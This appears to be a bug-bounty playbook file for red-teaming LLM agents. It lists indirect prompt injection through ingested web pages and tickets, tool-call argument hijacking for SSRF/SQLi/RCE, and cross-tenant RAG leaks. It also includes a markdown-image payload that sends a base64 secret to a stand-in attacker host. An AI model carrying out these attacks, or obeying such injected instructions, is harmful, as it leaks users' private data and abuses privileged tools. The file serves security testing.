---
name: viper-ai-llm-redteam
description: Agentic AI, LLM, and MCP Security Red-Team Playbook (OWASP LLM & Agentic Top 10). Covers indirect prompt injection, tool-call argument hijacking, system prompt leak, and RAG data exfiltration.
---

# ViperClaw Agentic AI & LLM Red-Teaming (`viper-ai-llm-redteam`)

## High-Impact AI Vulnerability Classes (Submittable Bounties)
Raw chatbot jailbreaks without security impact are rejected by almost all programs. Focus exclusively on **Agentic Tool Abuse, Cross-Tenant RAG Leaks, and Indirect Prompt Injection with State/Data Impact**:

| Attack Vector | Mechanism | Proven Impact Goal |
| :--- | :--- | :--- |
| **1. Indirect Prompt Injection via External Context** | Embed hidden instructions inside a webpage, webpage title, GitHub issue, PDF, email, or support ticket ingested by the victim's AI assistant. | Force the victim's agent to invoke an internal tool or exfiltrate private conversation/CRM data. |
| **2. Tool-Call Argument SSRF / SQLi / RCE** | Manipulate the LLM into passing attacker-controlled parameters into an internal MCP tool or function call (`run_sql`, `fetch_url`, `read_file`). | Achieve backend SSRF, arbitrary file read, or database extraction through the agent's privileged credentials. |
| **3. Markdown Image / Link Exfiltration** | Instruct the model to render `![status](https://attacker.tld/leak?d=<base64_secret>)` when CSP allows external images. | Zero-click exfiltration of cross-tenant RAG documents or user PII upon viewing the response. |
| **4. Cross-Tenant Vector DB / RAG Bleed** | Query shared embedding namespaces or manipulate metadata filters in RAG search endpoints. | Retrieve proprietary documents belonging to another organization/tenant. |
